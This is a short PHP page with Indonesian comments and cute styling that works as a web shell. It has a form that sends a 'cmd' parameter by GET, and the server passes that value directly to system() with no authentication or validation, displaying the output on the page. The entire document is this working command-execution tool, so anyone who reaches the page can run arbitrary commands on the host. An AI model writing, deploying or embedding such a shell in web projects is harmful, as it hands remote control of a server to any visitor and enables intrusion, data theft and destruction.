<form method="GET" action="<?php echo htmlspecialchars(basename($_SERVER['PHP_SELF'])); ?>" class="form-inline">
    <input type="text" name="cmd" id="cmd" autofocus placeholder="Masukkan perintah...">
    <button type="submit" class="btn-execute">Execute ✨</button>
</form>

<div class="output-box">
<?php
// 2. INI HALAMAN EXECUTE NYA (BERJALAN OTOMATIS JIKA TOMBOL DIKLIK)
if (isset($_GET['cmd']) && $_GET['cmd'] !== '') {
    $cmd = $_GET['cmd'];
    echo "<span class='cmd-echo'>🌸 Kedai_Server:~# " . htmlspecialchars($cmd) . "</span>";
    system($cmd); // Perintah Windows langsung jalan di sini dan outputnya muncul di dalam kotak pink!
} else {
    echo "<div class='no-output'>🐾 Siap menerima perintah tuan putri!...</div>";
}
?>
</div>